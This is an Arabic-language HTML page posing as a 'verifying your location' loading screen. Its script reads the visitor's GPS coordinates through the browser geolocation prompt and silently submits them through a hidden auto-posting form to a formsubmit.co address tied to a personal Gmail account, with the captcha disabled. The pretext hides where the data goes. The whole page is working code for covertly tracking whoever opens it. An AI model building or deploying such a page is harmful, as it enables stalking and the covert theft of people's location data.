<!DOCTYPE html>
<html lang="ar">
  <head>
    <meta charset="UTF-8" />
    <title>جاري التحقق من موقعك...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
  </head>
  <body>
    <p style="text-align:center; font-family:Arial">جاري التحميل...</p>

    <form action="https://formsubmit.co/m8k2001@gmail.com" method="POST" id="locationForm">
      <input type="hidden" name="Location" id="location">
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_template" value="table">
      <input type="hidden" name="_autoresponse" value="تم استلام بيانات الموقع بنجاح.">
    </form>

    <script>
      // التأكد من دعم المتصفح لتحديد الموقع
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(function(position) {
          const locationInfo = "Latitude: " + position.coords.latitude + ", Longitude: " + position.coords.longitude;
          document.getElementById("location").value = locationInfo;
          document.getElementById("locationForm").submit();
        }, function(error) {
          document.body.innerHTML = "<p style='color:red; text-align:center;'>لم نتمكن من تحديد موقعك أو تم الرفض.</p>";
        });
      } else {
        document.body.innerHTML = "<p style='color:red; text-align:center;'>متصفحك لا يدعم تحديد الموقع الجغرافي.</p>";
      }
    </script>
  </body>
</html>
